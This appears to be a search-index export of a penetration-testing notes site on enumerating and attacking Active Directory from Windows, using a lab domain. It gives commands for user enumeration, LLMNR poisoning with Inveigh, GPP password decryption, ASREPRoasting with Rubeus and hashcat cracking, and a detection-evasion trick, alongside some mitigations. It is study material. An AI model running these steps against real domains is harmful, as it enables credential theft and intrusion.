DisplayName\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#powerview","title":"Powerview","text":"<p>Using the\u00a0Get-DomainGPO\u00a0function from PowerView, we can get a listing of GPOs by name.</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainGPO |select displayname\n</code></pre> <p>Enumerating GPO Names with PowerView</p> <pre><code>$sid=Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Results:</p> <pre><code>ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nObjectSID             :\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner\n\n... SNIP ...\n</code></pre> <p>Converting GPO GUID to Name:</p> <pre><code>Get-GPO -Guid $GUID\n# Example:\n# Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n# In this case we  can see that the\u00a0`Domain Users`\u00a0group has several rights over the\u00a0`Disconnect Idle RDP`\u00a0GPO. \n</code></pre> <p>Checking in BloodHound, we can see that the\u00a0<code>Domain Users</code>\u00a0group has several rights over the\u00a0<code>Disconnect Idle RDP</code>\u00a0GPO. If we select the GPO in BloodHound and scroll down to\u00a0<code>Affected Objects</code>\u00a0on the\u00a0<code>Node Info</code>\u00a0tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p> <p>We could use a tool such as\u00a0SharpGPOAbuse\u00a0to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.</p> <p>When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/","title":"Enumerating Active Directory from Windows","text":"<p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul> <p>Tool for enumeration: </p> <ul> <li>Enumeration with LDAP queries</li> <li>PowerView.ps1 from PowerSploit project (powershell).</li> <li>The ActiveDirectory PowerShell module (powershell).</li> <li>BloodHound (C# and PowerShell Collectors).</li> <li>SharpView (C#).</li> <li>kerbrute.</li> <li>Crackmapexec.</li> <li>enum4linux.</li> <li>net.exe.</li> <li>powershell.</li> <li>ActiveDirectory PowerShell Module.</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#1-users","title":"1. Users","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#kerbrute","title":"Kerbrute","text":"<p>See kerbrute.</p> <p>It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.</p> <pre><code>sudo git clone https://github.com/ropnop/kerbrute.git\n\n# Typing make help will show us the compiling options available.\ncd kerbrute\nmake help\n\n# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).\nsudo make all\n\n# The newly created dist directory will contain our compiled binaries.\nls -la dist\n\n# Copy the file to the windows pivoting machine\nscp kerbrute_windows_amd64.exe username@$ip:~/\n</code></pre> <pre><code>kerbrute_windows_amd64.exe userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n# d: domain\n# --dc: domain controller\n# -o: output file\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powershell-and-net-commands","title":"powershell and net commands","text":"<p>See powershell</p> <pre><code># Prints all the information about the system\nsysteminfo\n\n# Prints the PC's Name\nhostname\n\n# Am I alone\nqwinsta\n\n# Display Powershell relevant Powershell version information\necho $PSVersion\necho $PSVersionTable\n\n# Prints out the OS version and revision level\n[System.Environment]::OSVersion.Version \n\n# Prints the patches and hotfixes applied to the host\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Displays a list of environment variables for the current session (ran from CMD-prompt)\nset \n\n# Return environment values such as key paths, users, computer information, etc.\nGet-ChildItem Env: | ft Key,Value   \n\n# Displays the domain name to which the host belongs (ran from CMD-prompt)\necho %USERDOMAIN%   \n\n# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)\necho %logonserver%  \n\n#You can tell if PowerShell is running with administrator privileges (a.k.a \u201celevated\u201d rights) with the following snippet:\n[Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'\n\n# Retrieves the WindowsIdentity for the currently running user.\n[Security.Principal.WindowsIdentity]::GetCurrent() \n\n# Access the groups property of the identity to find out what user groups the identity is a member of.\n[Security.Principal.WindowsIdentity]::GetCurrent()(...).groups\n\n# It returns true if groups contains the Well Known SID of the Administrators group (the identity will only contain it if \u201crun as administrator\u201d was used) and otherwise false.\n[Security.Principal.WindowsIdentity]::GetCurrent() -contains \"S-1-5-32-544\" \n\n# List disabled users with LDAP\nGet-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name\n</code></pre> <p>Net commands in powershell:</p> <pre><code># Information about domain groups\nnet group /domain   \n\n# List users with domain admin privileges\nnet group \"Domain Admins\" /domain\n\n# List of PCs connected to the domain\nnet group \"domain computers\" /domain    \n\n# List PC accounts of domains controllers\nnet group \"Domain Controllers\" /domain  \n\n# User that belongs to the group\nnet group &lt;domain_group_name&gt; /domain   \n\n# List of domain groups\nnet groups /domain  \n\n# All available groups\nnet localgroup  \n\n# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)\nnet localgroup administrators /domain   \n\n# Information about a group (admins)\nnet localgroup Administrators   \n\n# Add user to administrators\nnet localgroup administrators [username] /add   \n\n\n# Get information about a user within the domain\nnet user &lt;ACCOUNT_NAME&gt; /domain \n\n# List all users of the domain\nnet user /domain    \n\n# Information about the current user\nnet user %username% \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<pre><code>#Displays information about all local accounts and any domain accounts that have logged into the device\nwmic useraccount list /format:list  \n\n# Information about all local groups\nwmic group list /format:list    \n\n# Dumps information about any system accounts that are being used as service accounts.\nwmic sysaccount list /format:list   \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#activedirectory-powershell-module","title":"ActiveDirectory PowerShell module","text":"<p>See more at ActiveDirectory PowerShell module.</p> <p>Get-ADDomain: We'll enumerate some basic information about the domain with the Get-ADDomain cmdlet.</p> <pre><code># This will print out helpful information like the domain SID, domain functional level, any child domains, and more.\nGet-ADDomain\n</code></pre> <p>Get-ADUser: More on https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps.  </p> <pre><code># This command gets all users in the container OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM.\nGet-ADUser -Filter * -SearchBase \"OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM\"\n\n# This command gets all users that have a name that ends with SvcAccount:\nGet-ADUser -Filter 'Name -like \"*SvcAccount\"' | Format-Table Name,SamAccountName -A\n\n# This command gets all of the properties of the user with the SAM account name ChewDavid:\nGet-ADUser -Identity ChewDavid -Properties *\n\n# This command gets the user with the name ChewDavid in the Active Directory Lightweight Directory Services (AD LDS) instance:\nGet-ADUser -Filter \"Name -eq 'ChewDavid'\" -SearchBase \"DC=AppNC\" -Properties \"mail\" -Server lds.Fabrikam.com:50000\n\n# This command gets all enabled user accounts in Active Directory using an LDAP filter: meaning to return all disabled accounts\nGet-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'\n\n# search for all administrative users with the `DoesNotRequirePreAuth` attribute set, meaning that they can be ASREPRoasted:\nGet-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}\n\n\n\n# Find all administrative users with the SPN \"servicePrincipalName\" attribute set, meaning that they can likely be subject to a Kerberoasting attack\nGet-ADUser -Filter \"adminCount -eq '1'\" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl\n\n# Another way to retrieve Service Principals\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <p>Get-ADComputer: </p> <pre><code># Search domain computers for interesting hostnames. SQL servers are a particularly juicy target on internal assessments. The below command searches all hosts in the domain using `Get-ADComputer`, filtering on the `DNSHostName` property that contains the word `SQL`\nGet-ADComputer  -Filter \"DNSHostName -like 'SQL*'\"\n</code></pre> <p>Get-ADGroup:</p> <pre><code># Group enumeration\nGet-ADGroup -Filter * | select name\n\n# Get detailed information about a group\nGet-ADGroup -Identity \"Backup Operators\"\n\n# Search for administrative groups by filtering on the `adminCount` attribute. If set to `1`, it's protected by AdminSDHolder and known as protected groups. `AdminSDHolder` is owned by the Domain Admins group. It has the privileges to change the permissions of objects in Active Directory. \nGet-ADGroup -Filter \"adminCount -eq 1\" | select Name\n</code></pre> <p>Get-ADGroupMember:</p> <pre><code># Returns members of a group\nGet-ADGroupMember -Identity \"Backup Operators\"\n</code></pre> <p>Get-ADTrust: Verify domain trust relationships using the\u00a0Get-ADTrust\u00a0cmdlet. This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful  on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. </p> <pre><code>Get-ADTrust -Filter *\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powerview","title":"PowerView","text":"<p>See more at Powerview.</p> <p>Module: ActiveDirectory</p> <pre><code>########################\n# Domain/LDAP Functions\n########################\n\n# Returns the AD object for the current (or specified) domain\nGet-Domain  \n\n# Return a list of the Domain Controllers for the specified domain\nGet-DomainController    \n\n# Returns all users or specific user objects in AD\nGet-DomainUser  \n# Example: \n# Get-DomainUser -Identity $username -Domain $domain | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n\n# Checks for users with the SPN attribute set\nGet-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n\n# Returns all computers or specific computer objects in AD\nGet-DomainComputer  \n\n# Returns all groups or specific group objects in AD\nGet-DomainGroup \n\n# Searches for all or specific OU objects in AD\nGet-DomainOU\n\n# Finds object ACLs in the domain with modification rights set to non-built in objects\nFind-InterestingDomainAcl   \n\n# Returns the members of a specific domain group\nGet-DomainGroupMember   \n# Example: \n# Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n# Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) \n\n# Returns a list of servers likely functioning as file servers\nGet-DomainFileServer    \n\n# Returns a list of all distributed file systems for the current (or specified) domain\nGet-DomainDFSShare  \n\n\n########################\n# GPO Functions\n########################\n# Returns all GPOs or specific GPO objects in AD\nGet-DomainGPO   \n\n# Returns the default domain policy or the domain controller policy for the current domain\nGet-DomainPolicy    \n\n\n########################\n# Computer Enumeration Functions\n########################\n# Enumerates local groups on the local or a remote machine\nGet-NetLocalGroup\n\n# Enumerates members of a specific local group\nGet-NetLocalGroupMember \n\n# Returns open shares on the local (or a remote) machine\nGet-NetShare    \n\n# Returns session information for the local (or a remote) machine\nGet-NetSession  \n\n# Tests if the current user has administrative access to the local (or a remote) machine\nTest-AdminAccess    \n# Example: \n# Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n\n\n########################\n# Threaded 'Meta'-Functions:\n########################\n# Finds machines where specific users are logged in\nFind-DomainUserLocation \n\n# Finds reachable shares on domain machines\nFind-DomainShare    \n\n# Searches for files matching specific criteria on readable shares in the domain\nFind-InterestingDomainShareFile \n\n# Finds machines on the local domain where the current user has local administrator access\nFind-LocalAdminAccess   \n\n\n########################\n# Domain Trust Functions:\n########################\n# Returns domain trusts for the current domain or a specified domain\nGet-DomainTrust \n\n# Returns all forest trusts for the current forest or a specified forest\nGet-ForestTrust \n\n# Enumerates users who are in groups outside of the user's domain\nGet-DomainForeignUser   \n\n# Enumerates groups with users outside of the group's domain and returns each foreign member\nGet-DomainForeignGroupMember    \n\n# Enumerates all trusts for the current domain and any others seen.\nGet-DomainTrustMapping  \n</code></pre> <pre><code># Gets the ID for the current Domain (useful later for crafting Golden tickets)\nGet-DomainID\n\n# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts\nGet-DomainPolicy\n\n# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account\nGet-DomainSPNTicket\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#sharpview","title":"SharpView","text":"<p>More about SharpView.</p> <p>Download github repo from: https://github.com/tevora-threat/SharpView/.</p> <pre><code># Obtain help about a command\n\\SharpView.exe Get-DomainUser -Help\n\n# Get information about a given user\n.\\SharpView.exe Get-DomainUser -Identity $username\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#2-credentials","title":"2. Credentials","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#llmnrnbt-ns-poisoning-with-inveigh","title":"LLMNR/NBT-NS Poisoning with Inveigh","text":"<p>See Inveigh.</p> <p>LLMNR &amp; NBT-NS poisoning is possible from a Windows host as well. \u00a0Inveigh can listen to IPv4 and IPv6 and several other protocols, including\u00a0<code>LLMNR</code>, DNS,\u00a0<code>mDNS</code>, NBNS,\u00a0<code>DHCPv6</code>, ICMPv6,\u00a0<code>HTTP</code>, HTTPS,\u00a0<code>SMB</code>, LDAP,\u00a0<code>WebDAV</code>, and Proxy Auth.</p> <p>Powershell version: The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section).</p> <pre><code># Install the module\nImport-Module .\\Inveigh.ps1\n\n# List parameters\n(Get-Command Invoke-Inveigh).Parameters\n\n\n# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.\nInvoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre> <p>C#  version:  Before we can use the C# version of the tool, we have to compile the executable. After that we can run:</p> <pre><code>.\\Inveigh.exe\n</code></pre> <p>Results:</p> <pre><code>[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]\n[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[ ] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[ ] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[ ] MDNS\n[ ] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[ ] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[ ] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Tools]\n[+] Previous Session Files (Not Found)\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start HTTP listener on port 80, check IP and port usage.\n[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n</code></pre> <ul> <li><code>[+]</code>\u00a0 default option and enabled by default</li> <li><code>[ ]</code>\u00a0 disabled options </li> </ul> <p>Console access: Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.</p> <pre><code># List commands\n&gt; HELP\n\n# view unique captured hashes\n&gt; \u00a0GET NTLMV2UNIQUE\n\n#  see which usernames we have collected.\nGET NTLMV2USERNAMES\n</code></pre> <p>Mitigations:  To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS.</p> <ul> <li>We can disable LLMNR in Group Policy by going to Computer Configuration --&gt; Administrative Templates --&gt; Network --&gt; DNS Client and enabling \"Turn OFF Multicast Name Resolution.\"</li> <li>NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening\u00a0<code>Network and Sharing Center</code>\u00a0under\u00a0<code>Control Panel</code>, clicking on\u00a0<code>Change adapter settings</code>, right-clicking on the adapter to view its properties, selecting\u00a0<code>Internet Protocol Version 4 (TCP/IPv4)</code>, and clicking the\u00a0<code>Properties</code>\u00a0button, then clicking on\u00a0<code>Advanced</code>\u00a0and selecting the\u00a0<code>WINS</code>\u00a0tab and finally selecting\u00a0<code>Disable NetBIOS over TCP/IP</code>.</li> <li> <p>NBT-NS can also be disabled</p> <ul> <li>by creating a PowerShell script under Computer Configuration --&gt; Windows Settings --&gt; Script (Startup/Shutdown) --&gt; Startup with something like the following: </li> </ul> </li> </ul> <pre><code>regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\"\nGet-ChildItem $regkey |foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}\n</code></pre> <pre><code>- Double click on Startup, choose the PowerShell Scripts tab, and select \"For this GPO, run scripts in the following order\" to Run Windows PowerShell scripts first, and then click on Add and choose the script. \n- Reboot the target system or restart the network adapter.\n</code></pre> <p>To push this out to all hosts in a domain, we could create a GPO using\u00a0<code>Group Policy Management</code>\u00a0on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as: <code>\\\\inlanefreight.local\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts</code></p> <p>Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.</p> <p>Some detection methods: https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/ </p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#finding-passwords-in-the-description-field-using-get-domain-user","title":"Finding Passwords in the Description Field using Get-Domain User","text":"<pre><code># Import PowerView.ps1\nImport-Module .\\PowerView.ps1\n# Find passwords in descriptions\nGet-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#passwd_notreqd-field","title":"PASSWD_NOTREQD Field","text":"<p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). </p> <pre><code># Import PowerView.ps1\nImport-Module .\\PowerView.ps1\n# Find passwords in descriptions\nGet-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#credentials-in-smb-shares-and-sysvol-scripts","title":"Credentials in SMB Shares and SYSVOL Scripts","text":"<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. It is recommendable always have to look at it.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#group-policy-preferences-gpp-passwords","title":"Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> </ul> <p>These files can contain an array of configuration data and defined passwords. The\u00a0<code>cpassword</code>\u00a0attribute value is AES-256 bit encrypted, but Microsoft\u00a0published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</p> <p>This was patched in 2014\u00a0MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p> <p>In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the \u201ccpassword\u201d parameter that can get decrypted with Microsoft\u2019s public AES key (link). If you retrieve the cpassword value more manually, the\u00a0<code>gpp-decrypt</code>\u00a0utility can be used to decrypt the password as follows:</p> <pre><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>Locating &amp; Retrieving GPP Passwords with CrackMapExec</p> <pre><code>crackmapexec smb -L | grep gpp\n</code></pre> <p>To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules \u2014\u00a0<code>**gpp_password**</code>\u00a0and\u00a0<code>**gpp_autologin**</code>\u00a0modules. The\u00a0<code>**gpp_password**</code>\u00a0decrypts passwords stored in the Group.xml file, while\u00a0<code>**gpp_autologin**</code>\u00a0retrieves autologin information from the Registry.xml file in the preferences folder.</p> <pre><code>crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin\n# Example:\n# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n</code></pre> <p>Results: <pre><code>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']\n</code></pre></p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#asreproasting","title":"\ud83d\udca1 ASREPRoasting","text":"<p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. </p> <p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#dont_req_preauth-value-using-get-domainuser","title":"DONT_REQ_PREAUTH Value using Get-DomainUser","text":"<p>Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n</code></pre> <p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.</p> <pre><code># Retrieving AS-REP in Proper Format using Rubeus\n.\\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat\n# Example:\n# .\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat\n</code></pre> <p>Cracking the Hash Offline with Hashcat:</p> <pre><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#dont_req_preauth-value-using-kerbrute","title":"DONT_REQ_PREAUTH Value using kerbrute","text":"<pre><code># From linux\nkerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n\n# From Windows\n .\\kerbrute_Windows.exe userenum -d inlanefreight.local --dc 172.16.5.5 .\\users.txt\n</code></pre> <p>However, this will be as accurate as the user list.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#get-npuserspy-from-the-impacket-toolkit","title":"Get-NPUsers.py from the Impacket toolkit","text":"<pre><code># Retuns all users that with DONT_REQ_PREAUTH amd UF_DONT_REQ_PREAUTH\nGetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile jsmith.txt | grep -v SessionError\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#3-password-policy","title":"3. Password policy","text":"<p>Some tools work for this end: <code>net.exe</code>, PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#netexe","title":"net.exe","text":"<pre><code>net accounts\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powerview_1","title":"PowerView","text":"<p>Blocked by Microsoft Defender.  PowerView gave us the same output as our net accounts command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).</p> <pre><code>import-module .\\PowerView.ps1\n\nGet-DomainPolicy\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#windows-management-instrumentation-wmi_1","title":"Windows Management Instrumentation (<code>WMI</code>)","text":"<pre><code># Dumps information about any system accounts that are being used as service accounts.\nwmic sysaccount list /format:list   \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powershell","title":"Powershell","text":"<p>The net.exe commands: </p> <pre><code># Information about password requirements\nnet accounts    \n\n# Password and lockout policy\nnet accounts /domain\n\n# Information about the current user\nnet user %username% \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#group-policy-preferences-gpp-passwords_1","title":"Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> </ul> <p>These files can contain an array of configuration data and defined passwords. The\u00a0<code>cpassword</code>\u00a0attribute value is AES-256 bit encrypted, but Microsoft\u00a0published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</p> <p>This was patched in 2014\u00a0MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p> <p>In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the \u201ccpassword\u201d parameter that can get decrypted with Microsoft\u2019s public AES key (link). If you retrieve the cpassword value more manually, the\u00a0<code>gpp-decrypt</code>\u00a0utility can be used to decrypt the password as follows:</p> <pre><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>Locating &amp; Retrieving GPP Passwords with CrackMapExec</p> <pre><code>crackmapexec smb -L | grep gpp\n</code></pre> <p>To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules \u2014\u00a0<code>**gpp_password**</code>\u00a0and\u00a0<code>**gpp_autologin**</code>\u00a0modules. The\u00a0<code>**gpp_password**</code>\u00a0decrypts passwords stored in the Group.xml file, while\u00a0<code>**gpp_autologin**</code>\u00a0retrieves autologin information from the Registry.xml file in the preferences folder.</p> <pre><code>crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin\n# Example:\n# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n</code></pre> <p>Results: <pre><code>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']\n</code></pre></p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#4-networks","title":"4. Networks","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powershell_1","title":"Powershell","text":"<p>See powershell.</p> <pre><code># Lists all known hosts stored in the arp table.\narp -a\n\n# Prints out adapter settings for the host. We can figure out the network segment from here.\nipconfig /all   \n\n# Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.\nroute print\n\n# Displays the status of the host's firewall. We can determine if it is active and filtering traffic.\nnetsh advfirewall show allprofiles\n</code></pre> <p>Evasion trick: If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing\u00a0<code>net1</code>\u00a0instead of\u00a0<code>net</code>\u00a0will execute the same functions without the potential trigger from the net string. The net.exe commands: </p> <pre><code># Information about password requirements\nnet accounts    \n\n# Password and lockout policy\nnet accounts /domain\n\n# Information about domain groups\nnet group /domain   \n\n# List users with domain admin 